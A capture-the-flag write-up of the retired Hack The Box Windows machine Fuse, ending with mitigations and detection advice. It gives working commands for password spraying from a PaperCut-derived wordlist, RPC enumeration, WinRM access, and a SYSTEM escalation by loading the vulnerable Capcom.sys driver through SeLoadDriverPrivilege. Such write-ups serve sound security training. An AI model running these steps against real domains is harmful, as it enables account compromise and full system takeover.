---
machine: Fuse
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, active-directory, papercut, password-spray, rpc, winrm, seloaddriver, capcom]
---

# Fuse — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The PaperCut log panel exposes usernames and text that can seed a password list. An SMB spray finds an account with a default password and a forced change. After changing it, RPC reveals `svc-print` credentials; that account has WinRM and `SeLoadDriverPrivilege`. The vulnerable Capcom.sys driver is loaded to obtain SYSTEM.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p53,80,88,135,139,389,445,636,3268,5985 <IP>
```

- Domain controller for `fabricorp.local`.
- IIS on 80, SMB, LDAP, Kerberos and WinRM.
- The website redirects to `fuse.fabricorp.local/papercut/logs/html/index.htm`.

## Enumeration

Add the domain and host to `/etc/hosts` and review the PaperCut panel. Print-job pages show usernames and document names.

```bash
cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers > words.txt
```

Spray the list against SMB with `crackmapexec` or `hydra`. Account `bhult` uses the default password `<DEFAULT_PASSWORD>` and requires a change.

```bash
smbpasswd -r <IP> -U bhult
rpcclient -U 'bhult%<NEW_PASSWORD>' <IP>
```

## Foothold

`rpcclient` allows user enumeration. The description field of `svc-print` contains the password `<SVC_PASSWORD>`. The account can use WinRM.

```bash
crackmapexec winrm <IP> -u svc-print -p '<SVC_PASSWORD>'
evil-winrm -i <IP> -u svc-print -p '<SVC_PASSWORD>'
```

Read `user.txt`. The scheduled task `Revert Password and Expiry` resets `bhult`'s password every minute, so RPC access must be renewed.

## Privilege escalation

```powershell
whoami /priv
```

`svc-print` has `SeLoadDriverPrivilege` enabled. Upload `Capcom.sys` and `EoPLoadDriver.exe`, register the driver and run `ExploitCapcom.exe` to steal the SYSTEM token.

```powershell
.\EoPLoadDriver.exe System\CurrentControlSet\dfserv C:\ProgramData\Capcom.sys
.\ExploitCapcom.exe
```

The tool launches a shell as `NT AUTHORITY\SYSTEM`; read `root.txt`.

## Evidence

- PaperCut panel with usernames and documents redacted.
- `smbpasswd` and `rpcclient queryuser` without real credentials.
- `whoami /priv` showing `SeLoadDriverPrivilege`.
- `ExploitCapcom` and `whoami` as SYSTEM.

## Lessons learned

- Print panels can leak usernames and context for a spray.
- A default password with a forced change is not safe when the policy is weak.
- `SeLoadDriverPrivilege` allows loading vulnerable drivers and escalating to kernel/SYSTEM.

## Mitigations and detection

- Restrict access to the PaperCut panel and do not publish job logs.
- Enforce unique passwords and remove accounts with default credentials.
- Remove `SeLoadDriverPrivilege` from service accounts.
- Alert on driver loads (Event ID 7045), service creation and execution of `EoPLoadDriver` or `Capcom.sys`.

## References

- <https://www.hackthebox.com/machines/Fuse>
- <https://attack.mitre.org/techniques/T1110/003/>
- <https://attack.mitre.org/techniques/T1068/>
- <https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-best-practices>
